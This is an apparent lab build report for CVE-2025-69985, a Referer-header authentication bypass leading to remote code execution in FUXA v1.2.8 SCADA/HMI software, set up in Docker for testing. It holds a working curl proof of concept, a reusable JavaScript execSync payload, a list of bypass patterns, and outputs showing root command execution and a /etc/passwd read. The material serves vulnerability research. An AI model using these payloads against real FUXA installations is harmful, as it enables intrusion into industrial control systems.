# Lab Build Report: CVE-2025-69985

## Lab Architecture

**Single-container lab** running FUXA v1.2.8 (vulnerable) from the official Docker Hub image `frangoteam/fuxa:1.2.8`. FUXA is a self-contained Node.js/SQLite SCADA/HMI application — no external database or services required.

### Container Topology

| Container | Image | Role | Port |
|-----------|-------|------|------|
| `cve-2025-69985-vulnerable` | `lab-vulnerable` (based on `frangoteam/fuxa:1.2.8`) | Vulnerable FUXA v1.2.8 instance | 1881 |

### Networks

| Network | Type | Purpose |
|---------|------|---------|
| `lab_lab-net` | bridge | Internal lab communication |

---

## Container Details

### cve-2025-69985-vulnerable

- **Container Name**: `cve-2025-69985-vulnerable`
- **Base Image**: `frangoteam/fuxa:1.2.8` (Node.js 18 on Debian Bookworm)
- **Exposed Port**: 1881 (HTTP)
- **Access**: `localhost:1881` (via port mapping)
- **Health Check**: `curl -sf http://localhost:1881` (interval: 10s, retries: 12, start_period: 30s)
- **Status**: Running, Healthy

### Configuration

The FUXA instance runs with its default configuration. Authentication is enforced via the `requireAuth` middleware, which checks the HTTP `Referer` header before falling back to JWT verification. The vulnerability allows bypassing this check entirely.

A copy of a `secureEnabled: true` settings file is stored at `/tmp/mysettings-secure.json` inside the container for optional testing.

---

## Build Status

| Step | Status | Notes |
|------|--------|-------|
| Pull `frangoteam/fuxa:1.2.8` | ✅ Success | Official Docker Hub image |
| Build `lab-vulnerable` image | ✅ Success | Thin layer on top of official image |
| Container start | ✅ Success | Healthy in ~10s |
| HTTP connectivity | ✅ Verified | HTTP 200 on port 1881 |
| Auth enforcement | ✅ Verified | Returns 401 without Referer header |
| Auth bypass + RCE | ✅ Verified | Full RCE as root with Referer bypass |

---

## Start/Stop Commands

```bash
# Start the lab
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs -f

# Stop the lab
docker compose down

# Full reset (remove volumes)
docker compose down -v
```

---

## Verification Evidence

### Test 1: Auth Enforcement (without Referer)
```
POST /api/runscript → HTTP 401
{"error":"unauthorized_error","message":"Authentication required!"}
```

### Test 2: Auth Bypass via Referer + RCE (id)
```
POST /api/runscript
Referer: http://<target>:1881/fuxa
→ "uid=0(root) gid=0(root) groups=0(root)"
```

### Test 3: Arbitrary Command Execution (uname -a)
```
POST /api/runscript
Referer: http://<target>:1881/fuxa
→ "Linux ad688b93e5f3 6.12.68-linuxkit ..."
```

### Test 4: Alternative Bypass — /editor from external origin
```
POST /api/runscript
Referer: http://attacker.com/editor
→ "root"
```

### Test 5: Alternative Bypass — localhost: pattern
```
POST /api/runscript
Referer: http://localhost:12345
→ "root"
```

### Test 6: Sensitive File Read
```
POST /api/runscript
Referer: http://<target>:1881/fuxa
→ "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:..."
```

---

## Exploitation Reference

### Minimal PoC (curl)

```bash
# Use localhost with mapped port
TARGET=localhost

curl -s -X POST "http://${TARGET}:1881/api/runscript" \
  -H "Content-Type: application/json" \
  -H "Referer: http://${TARGET}:1881/fuxa" \
  -d '{"params":{"script":{"test":true,"name":"exploit","code":"return require(\"child_process\").execSync(\"id\").toString()","parameters":[]}}}'
```

### Bypass Patterns

The `requireAuth` middleware trusts the `Referer` header. Any of these patterns bypass authentication:

1. **Host match**: `Referer: http://<target-host>:1881/anything` — matches `req.headers.host`
2. **Path patterns**: Any URL containing `/fuxa`, `/editor`, `/viewer`, `/lab`, `/home`
3. **Localhost patterns**: Any URL containing `localhost:`, `127.0.0.1:`, `0.0.0.0:`

Pattern 2 is the most powerful — an attacker can use `Referer: http://attacker.com/fuxa` from any origin.

### Payload Structure

```json
{
  "params": {
    "script": {
      "test": true,
      "name": "exploit",
      "code": "return require('child_process').execSync('COMMAND').toString()",
      "parameters": []
    }
  }
}
```

Key fields:
- `test: true` — routes to `runTestScript()` which compiles and executes arbitrary JS
- `name` — arbitrary function name
- `code` — arbitrary JavaScript (compiled via `Module._compile()`)
- `parameters` — must be array (can be empty)

---

## Lab Files

| File | Path | Purpose |
|------|------|---------|
| `docker-compose.yml` | `docker-compose.yml` | Container orchestration |
| `Dockerfile.vulnerable` | `Dockerfile.vulnerable` | Vulnerable FUXA v1.2.8 image |
| `appdata/mysettings.json` | `appdata/mysettings.json` | Optional secure config for testing |

---

## Known Issues

1. **Container runs as root**: The FUXA Docker image runs as root by default, so RCE gives full system access
2. **No rate limiting on exploit path**: The rate limiter is applied after the API routes in Express middleware order, so it doesn't protect against rapid exploitation
3. **Config baked in**: The Dockerfile copies config files directly rather than using bind mounts for portability.
4. **Image size**: The `frangoteam/fuxa:1.2.8` image is large (~1.5GB) due to ODBC drivers and build dependencies included in the official image
